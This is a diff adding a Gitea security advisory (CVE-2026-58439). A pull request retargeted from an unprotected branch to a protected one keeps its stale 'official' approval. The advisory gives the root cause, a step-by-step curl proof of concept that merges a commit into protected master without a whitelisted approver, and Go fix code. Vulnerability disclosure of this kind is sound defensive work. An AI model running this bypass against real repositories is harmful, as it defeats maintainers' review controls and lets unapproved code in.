@@ -1,0 +1,65 @@
+{
+  "id": "GHSA-w5pg-649r-p6gg",
+  "modified": "2026-07-21T20:30:32.894212803Z",
+  "published": "2026-07-21T20:14:12Z",
+  "aliases": [
+    "CVE-2026-58439"
+  ],
+  "summary": "Gitea: Branch Protection Bypass via PR Retargeting Preserves Stale `official` Approval Flag",
+  "details": "## Summary\n\nGitea does not re-evaluate the `official` flag on existing pull request reviews when a PR's target branch is changed. An attacker with write access to a repository can obtain an `official: true` approval on a PR targeting an unprotected branch, then retarget the PR to a protected branch (e.g., `master`). The approval, which would have been `official: false` if submitted against the protected branch, is preserved and satisfies the protected branch's required approvals, allowing the attacker to merge without legitimate maintainer approval.\n\n- Confirmed on Gitea **1.25.4** (`1.25.4+41-g96515c0f20`)\n\n## Vulnerability Details\n\n### Root Cause\n\nWhen a review is submitted on a pull request, Gitea computes the `official` flag by checking whether the reviewer is in the **target branch's** approval whitelist (`IsUserOfficialReviewer` in `models/git/protected_branch.go`). This flag is stored in the database as a boolean on the review record.\n\nWhen a PR's target branch is subsequently changed via `ChangeTargetBranch` (`services/pull/pull.go:218`), the function:\n- Updates `pr.BaseBranch`\n- Recalculates merge feasibility and divergence\n- Deletes old push comments\n- Creates a \"change target branch\" comment\n\nBut it does **not**:\n- Re-evaluate `official` on existing reviews\n- Dismiss existing approvals\n- Check whether reviewers are in the new target branch's approval whitelist\n\nAt merge time, `GetGrantedApprovalsCount` (`models/issues/pull.go:766`) counts reviews where `official = true AND dismissed = false AND type = Approve`. It reads the stored boolean — it does not re-check the whitelist. The stale `official: true` from the unprotected branch satisfies the protected branch's approval requirement.\n\n### Relevant Code Paths\n\n1. **Review creation** — `services/pull/review.go:SubmitReview` calls `IsOfficialReviewer` against the current `pr.BaseBranch`'s protection rules, stores `official=true/false`\n2. **Target branch change** — `services/pull/pull.go:ChangeTargetBranch` modifies `pr.BaseBranch` but does not touch existing reviews\n3. **Merge check** — `services/pull/check.go:CheckPullMergeable` → `models/issues/pull.go:GetGrantedApprovalsCount` counts stored `official=true` reviews without re-evaluating against the new branch's whitelist\n\n### Prerequisites\n\nThe attacker needs:\n- **Write (push) access** to the repository (collaborator with write role, or the ability to create branches — not admin)\n- The ability to create pull requests (standard for any user with push access)\n- A second account (or any non-admin account) to submit the approval on the unprotected branch\n\nThe attacker does **not** need:\n- Admin access\n- To be in the approval whitelist for the protected branch\n- Any interaction from the branch protection's designated approvers\n\n## Proof of Concept\n\n### Setup\n\nRepository `owner/repo` with branch `master` protected:\n- Required approvals: 1\n- Approval whitelist enabled, containing only user `admin-reviewer`\n- User `attacker` has write access but is **not** in the approval whitelist\n\n### Steps\n\n```bash\nBASE=\"http://gitea-instance:3000\"\nOWNER=\"owner\"\nREPO=\"repo\"\nATTACKER_AUTH=\"attacker:password\"\nACCOMPLICE_AUTH=\"accomplice:password\"  # any non-whitelisted user\n\n# 1. Create an unprotected temporary branch from master\ncurl -X POST \"$BASE/api/v1/repos/$OWNER/$REPO/branches\" \\\n  -u \"$ATTACKER_AUTH\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"new_branch_name\": \"tmp-unprotected\", \"old_branch_name\": \"master\"}'\n\n# 2. Push a malicious commit to a feature branch\ngit checkout -b malicious-branch origin/master\necho \"malicious payload\" \u003e payload.txt\ngit add payload.txt\ngit commit -m \"innocent looking commit\"\ngit push origin malicious-branch\n\n# 3. Create PR targeting the UNPROTECTED branch\ncurl -X POST \"$BASE/api/v1/repos/$OWNER/$REPO/pulls\" \\\n  -u \"$ATTACKER_AUTH\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"head\": \"malicious-branch\",\n    \"base\": \"tmp-unprotected\",\n    \"title\": \"Add feature\"\n  }'\n# Returns PR #N\n\n# 4. Approve the PR (official=true because tmp-unprotected has no protection)\ncurl -X POST \"$BASE/api/v1/repos/$OWNER/$REPO/pulls/N/reviews\" \\\n  -u \"$ACCOMPLICE_AUTH\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"event\": \"APPROVED\", \"body\": \"LGTM\"}'\n# Response includes: \"official\": true\n\n# 5. Retarget the PR to protected master\ncurl -X PATCH \"$BASE/api/v1/repos/$OWNER/$REPO/pulls/N\" \\\n  -u \"$ATTACKER_AUTH\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"base\": \"master\"}'\n\n# 6. Verify: approval is still official=true against master\ncurl \"$BASE/api/v1/repos/$OWNER/$REPO/pulls/N/reviews\" \\\n  -u \"$ATTACKER_AUTH\"\n# Response: \"official\": true, \"dismissed\": false, \"stale\": false\n\n# 7. Merge — succeeds despite no whitelisted approver reviewing\ncurl -X POST \"$BASE/api/v1/repos/$OWNER/$REPO/pulls/N/merge\" \\\n  -u \"$ATTACKER_AUTH\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"do\": \"merge\"}'\n# Returns 200 OK — malicious commit is now on master\n```\n\n### Observed API Responses\n\n**Step 4** — Approval on unprotected branch:\n```json\n{\"id\": 16, \"state\": \"APPROVED\", \"official\": true, \"dismissed\": false, \"user\": {\"login\": \"accomplice\"}}\n```\n\n**Step 6** — Same approval after retarget to protected master:\n```json\n{\"id\": 16, \"state\": \"APPROVED\", \"official\": true, \"dismissed\": false, \"stale\": false, \"user\": {\"login\": \"accomplice\"}}\n```\n\nThe `official` flag is unchanged. Under the protected branch's rules, this user's approval should be `official: false`.\n\n## Impact\n\n- **Branch protection bypass**: Protected branches with approval whitelists can be merged into without any whitelisted user approving\n- **Privilege escalation**: A user with write-but-not-admin access can effectively nullify the admin-configured approval requirements\n\n## Suggested Fix\n\nRe-evaluate the `official` flag on all existing reviews when a PR's target branch changes. In `services/pull/pull.go:ChangeTargetBranch`, after updating `pr.BaseBranch`:\n\n```go\n// After updating the base branch, re-evaluate official status on all reviews\nreviews, err := issues_model.FindReviews(ctx, issues_model.FindReviewOptions{\n    IssueID: pr.IssueID,\n    Type:    issues_model.ReviewTypeApprove,\n})\nif err != nil {\n    return err\n}\n\nnewProtectBranch, err := git_model.GetFirstMatchProtectedBranchRule(ctx, pr.BaseRepoID, targetBranch)\nif err != nil {\n    return err\n}\n\nfor _, review := range reviews {\n    wasOfficial := review.Official\n    if newProtectBranch != nil \u0026\u0026 newProtectBranch.EnableApprovalsWhitelist {\n        review.Official = git_model.IsUserOfficialReviewer(ctx, newProtectBranch, review.Reviewer)\n    } else {\n        review.Official = false\n    }\n    if wasOfficial != review.Official {\n        if _, err := db.GetEngine(ctx).ID(review.ID).Cols(\"official\").Update(review); err != nil {\n            return err\n        }\n    }\n}\n```\n\nAlternatively, dismiss all existing approvals on retarget (simpler, more conservative):\n\n```go\n// Dismiss all approvals when target branch changes\nif _, err := issues_model.DismissReview(ctx, \u0026issues_model.DismissReviewOptions{\n    IssueID: pr.IssueID,\n    Message: \"Dismissed: PR target branch changed\",\n}); err != nil {\n    return err\n}\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "go-gitea/gitea",
+        "purl": "pkg:golang/go-gitea/gitea"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.27.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-w5pg-649r-p6gg/GHSA-w5pg-649r-p6gg.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-w5pg-649r-p6gg"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/pull/38319"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/pull/38402"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/commit/74ad781db9c37134ee9280c69a6b1de53801503e"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/commit/8401fe7c544abff1ecc49d7f3166fd4ee0c174ef"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-gitea/gitea"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/releases/tag/v1.27.0"
+    }
+  ]
+}
